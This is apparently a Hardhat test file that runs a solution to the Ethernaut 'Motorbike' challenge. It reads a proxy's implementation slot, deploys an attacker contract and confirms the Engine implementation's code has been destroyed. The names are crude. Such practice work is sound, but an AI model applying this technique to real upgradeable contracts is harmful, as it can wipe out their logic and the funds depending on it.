import { expect } from "chai";
import { ethers } from "hardhat";
import { Motorbike, Engine, FuckMotorbike } from "../typechain-types";

describe("Motorbike", function () {

  let motorbike: Motorbike;
  let engine: Engine;
  let fuckMotorbike: FuckMotorbike;

  beforeEach(async function () {
    const engineFactory = await ethers.getContractFactory("Engine");
    engine = await engineFactory.deploy();
    await engine.deployed();

    const motorbikeFactory = await ethers.getContractFactory("Motorbike");
    motorbike = await motorbikeFactory.deploy(engine.address);
    await motorbike.deployed();

  });

  it("Should fuck Motorbike success", async function () {
    const _IMPLEMENTATION_SLOT = '0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc';
    const implementationSlot = await ethers.provider.getStorageAt(motorbike.address, _IMPLEMENTATION_SLOT);

    const engineContractAddress = `0x${implementationSlot.slice(-40)}`;

    expect(ethers.utils.getAddress(engineContractAddress)).to.be.eq(engine.address);


    const fuckMotorbikeFactory = await ethers.getContractFactory("FuckMotorbike");
    fuckMotorbike = await fuckMotorbikeFactory.deploy(engineContractAddress);
    await fuckMotorbike.deployed();

    await fuckMotorbike.fuck();

    expect(await ethers.provider.getCode(engineContractAddress)).to.be.eq("0x");
  });

});
